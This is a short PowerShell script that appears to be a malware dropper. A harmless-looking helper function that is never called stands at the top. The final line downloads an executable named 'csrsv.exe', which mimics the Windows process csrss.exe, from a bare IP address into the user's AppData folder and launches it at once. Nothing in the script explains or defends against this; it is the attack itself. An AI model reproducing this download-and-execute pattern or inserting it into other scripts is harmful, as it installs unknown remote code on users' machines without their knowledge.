function Get-ScriptDirectory
{

    if($hostinvocation -ne $null)
    {
        Split-Path $hostinvocation.MyCommand.path
    }
    else
    {
        Split-Path $script:MyInvocation.MyCommand.Path
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

